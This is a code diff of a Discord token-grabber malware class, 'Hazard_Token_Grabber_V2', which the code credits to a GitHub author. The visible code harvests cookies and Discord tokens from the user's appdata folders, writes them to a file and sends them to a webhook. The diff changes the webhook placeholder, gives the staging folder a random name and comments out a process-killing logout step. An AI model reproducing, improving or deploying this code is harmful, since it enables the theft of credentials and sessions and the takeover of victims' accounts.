@@ -4,11 +4,11 @@ from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
     def __init__(self):
-        self.webhook = "YOUR_WEBHOOK"
+        self.webhook = "WEBHOOK_HERE"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.tempfolder = self.appdata+'\\temp_folder'
+        self.tempfolder = f"{self.appdata}\\{self.letters(8)}"
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
@@ -22,7 +22,7 @@ class Hazard_Token_Grabber_V2:
         self.grabCookies()
         self.grabTokens()
         self.SendInfo()
-        self.LogOut()
+        # self.LogOut()
 
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
@@ -32,6 +32,9 @@ class Hazard_Token_Grabber_V2:
         if token:
             headers.update({"Authorization": token})
         return headers
+
+    def letters(self, stringLength):
+        return ''.join(random.choice(string.ascii_letters) for i in range(stringLength))
 
     def LogOut(self):
         for proc in psutil.process_iter():
@@ -185,7 +188,7 @@ class Hazard_Token_Grabber_V2:
             pass
 
     def grabTokens(self):
-        f = open (self.appdata+"\\temp_folder\\Discord Tokens.txt", "w+")
+        f = open (self.tempfolder+"\\Discord Tokens.txt", "w+")
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
